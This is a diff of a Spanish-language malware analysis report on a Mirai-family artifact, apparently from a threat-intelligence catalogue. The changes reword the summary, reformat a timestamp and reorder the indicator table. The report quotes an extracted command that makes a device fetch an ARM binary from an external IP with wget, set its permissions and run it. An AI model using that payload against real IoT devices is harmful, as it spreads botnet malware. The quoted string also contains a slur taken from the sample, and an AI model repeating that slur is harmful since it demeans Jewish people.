@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se registró 1 detección YARA válida. Se asoció 1 comando observado o extraído.
+Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos. Una detección YARA válida respalda el análisis.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:27:32+00:00`
+- **Registrado:** `2026-08-09T19:27:32.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,8 +54,8 @@ GET /shell?cd+/tmp;wget+http:/\/94.154.43.XXX/manji.arm4;chmod+777+manji.arm4;./
 | --- | --- | --- |
 | ip | 190.179.164.XXX | static_analysis |
 | ip | 94.154.43.XXX | static_analysis |
-| hash | acf265e07fbb979a4bd91d2f322b9089153c7ace051af7ad71172888cb7b5342 | static_analysis |
 | command | GET /shell?cd+/tmp;wget+http:/\/94.154.43.XXX/manji.arm4;chmod+777+manji.arm4;./manji.arm4+jews;wget+http:/\/94.154.43.XXX | strings |
+| hash | acf265e07fbb979a4bd91d2f322b9089153c7ace051af7ad71172888cb7b5342 | static_analysis |
 
 ## 🧬 Detecciones YARA
 
